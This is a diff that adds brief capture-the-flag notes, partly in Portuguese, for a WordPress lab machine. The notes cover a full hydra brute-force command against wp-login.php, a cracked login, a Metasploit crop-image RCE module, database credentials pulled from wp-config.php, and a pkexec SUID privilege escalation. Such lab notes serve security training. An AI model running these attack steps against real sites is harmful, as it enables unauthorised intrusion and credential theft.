@@ -1,0 +1,36 @@
+usernames:
+
+bjoel
+kwheel
+Karen Wheeler
+Billy Joel
+
+cms: wordpress
+version: 5.0
+
+hydra: hydra -l kwheel -P ~/Downloads/Wordlists/john.txt 10.66.181.136 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -F -V -I
+
+Username: kwheel
+Password: cutiepie1
+
+exploit: exploit(multi/http/wp_crop_rce)
+set username
+set password
+set rhost
+set lhost
+
+cat wp-config.php:
+
+username_db: wordpressuser
+password_db: LittleYellowLamp90!@
+url_db: localhost
+
+virando root:
+
+find / -name root -perm -4000 2> /dev/null
+/usr/bin/pkexec --version
+escalei root através do exploit do pkexec!
+
+pegando as flags:
+
+find / -name "user.txt" 2>/dev/null
